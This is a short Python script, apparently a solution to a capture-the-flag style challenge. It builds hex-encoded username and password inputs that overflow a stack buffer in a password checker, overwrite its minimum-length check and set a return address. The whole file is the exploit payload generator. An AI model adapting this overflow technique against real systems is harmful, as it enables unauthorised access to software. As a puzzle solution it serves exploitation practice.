#!/usr/bin/python

import utils
from binascii import hexlify, unhexlify

def ub():
    u = utils.mk_test_hex(0x63*2)
    ub = bytearray(unhexlify(u))
    #this ends up overwriting the value used to check min length of password
    #we set it low to ensure we pass, but non-zero to avoid ending the string
    ub[0x11] = 1
    #smash the stack!
    ub[0x2a:0x2b] = [0x4a, 0x44]
    return ub

def pb():
    pb = bytearray('0123456789abcdef112345689abcdef2123456789abcdef')
    #password must be zero-terminated at 0x11
    pb[0x11] = 0
    #jump to this address?
    return pb

if __name__ == '__main__':
    print 'username: %s' % hexlify(ub())
    print 'password: %s' % hexlify(pb())
